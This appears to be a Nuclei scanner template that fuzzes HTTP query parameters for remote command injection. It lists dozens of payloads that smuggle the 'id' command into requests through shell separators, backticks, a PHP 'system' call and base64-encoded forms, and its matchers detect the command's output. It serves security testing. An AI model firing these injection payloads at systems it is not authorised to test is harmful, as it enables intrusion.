id: rce-query

info:
  name: Remote Code Execution
  author: reewardius
  severity: critical
  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-query,rce,dast
  
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
        condition: and
        
    payloads:
      rce:
        - '||/usr/bin/id||'
        - '$;id'
        - "1;id"
        - ';";id'
        - ';";id;'
        - "& `id`"
        - "& id &"
        - "& id"
        - "&$(id)"
        - "&& id"
        - "&&$(id)"
        - "&&`id`"
        - "&&id"
        - "&&id&&"
        - "&`id`"
        - "&id"
        - "&id&"
        - ");id"
        - ");id;"
        - ");id|"
        - ")id "
        - ")|id"
        - ")|id;"
        - "; $(id)"
        - "; `id` #"
        - "; `id`"
        - "; id"
        - "; id;"
        - "; id\n"
        - "; id|"
        - "; |id|"
        - "\n&&id"
        - "\n;id"
        - "\nid"
        - "\nid\n"
        - "\n||$(id)"
        - "\n||`id`"
        - "\n||id"
        - "\r&&id"
        - "\r;id"
        - "\r\n&&id&&"
        - "\r\n;id"
        - "\r\n||$(id)"
        - "\r\n||`id`"
        - "\r\n||id"
        - "\r\n||id||"
        - "\r||$(id)"
        - "\r||`id`"
        - "\r||id"
        - "a);id"
        - "a);id|"
        - "a;id"
        - "a;id;"
        - "| `id` #"
        - "| `id`"
        - "| id"
        - "|id"
        - "|id;"
        - "|id|"
        - "|| `id` #"
        - "|| `id`"
        - "|| id"
        - "||$(id)"
        - "||$(id);"
        - "||$(id)||"
        - "||`id`"
        - "||`id`||"
        - "||id"
        - "||id;"
        - "||id|"
        - "||id||"
        - '"><?php echo system("id");?>'
        - '; echo `id`;'
        - '; echo exec(id);'
        - 'echo exec(id);'
        - 'YGlkYA=='
        - 'O2BpZGA7'
        - 'O2lkOw=='
        - 'fHxgaWRgfHw='
        - 'JiZpZCYm'
        
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{rce}}"
          
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      # Строгая проверка формата вывода команды id (Unix/Linux)
      - type: regex
        part: body
        regex:
          # uid=NUMBER(username) gid=NUMBER(groupname)
          - 'uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+\([a-zA-Z0-9_-]+\)'
          # uid=NUMBER(username) gid=NUMBER(groupname) groups=...
          - 'uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*groups='
        condition: or
        
      # Windows ошибка (доказательство попытки выполнения)
      - type: word
        part: body
        words:
          - "'id' is not recognized as an internal or external command"
          - "'id' не является внутренней или внешней командой"
        
      # Bash ошибка синтаксиса (доказательство интерпретации команды)
      - type: regex
        part: body
        regex:
          - 'syntax error near unexpected token.*id'
          - 'sh:.*id.*not found'
          
      # PHP info (для PHP RCE payloads)
      - type: regex
        part: body
        regex:
          - 'PHP Version\s+\d+\.\d+\.\d+'
          
      - type: word
        words:
          - "This is perl"
          
    extractors:
      - type: regex
        part: body
        regex:
          - 'uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*'
        group: 0
